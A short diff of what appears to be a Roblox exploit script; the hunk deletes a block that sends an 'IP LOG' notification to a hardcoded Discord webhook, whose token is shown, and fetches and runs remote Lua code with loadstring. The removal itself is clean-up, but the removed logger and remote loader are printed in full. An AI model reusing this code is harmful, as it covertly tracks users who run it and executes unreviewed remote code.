@@ -1,23 +1,5 @@
 
 
--- Code here
-
-wait(1)
-getgenv().Title = "New script used | IP LOG"
-getgenv().ThumbnailUrl = "https://cdn.discordapp.com/attachments/1210549370806734868/1237401294315061253/Screenshot_2024-05-02-20-18-05-91_572064f74bd5f9fa804b05334aa4f912.jpg?ex=663b8342&is=663a31c2&hm=7e6448298b28ea190a570964c31c08219df9a6182475670a4f559de54238bab0&"
-getgenv().Color = 0x000000 
-
-getgenv().FieldTitle = "Script"
-getgenv().FieldText = "loadstring(game:HttpGet("https://raw.githubusercontent.com/DarTGTtfd/Test-Hub-Official/main/Test%20oficial"))()"
-
-getgenv().FooterText = "DaryGT Script Log"
-getgenv().FooterUrl = "https://cdn.discordapp.com/attachments/1210549370806734868/1237401294315061253/Screenshot_2024-05-02-20-18-05-91_572064f74bd5f9fa804b05334aa4f912.jpg?ex=663b8342&is=663a31c2&hm=7e6448298b28ea190a570964c31c08219df9a6182475670a4f559de54238bab0&"
-
-getgenv().Webhook = "https://discord.com/api/webhooks/1269385646578073612/hAwLlzCsFpx3ons0TgL0wxZVRay3npqe7h4OiG3bC_03ou06hISKjua_2yRUqXhxMmPd"
-
-coroutine.wrap(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAScripts/Webhook/main/Notifer.lua"))()
-end)()
-
 
 
 if game.PlaceId == 2753915549 then
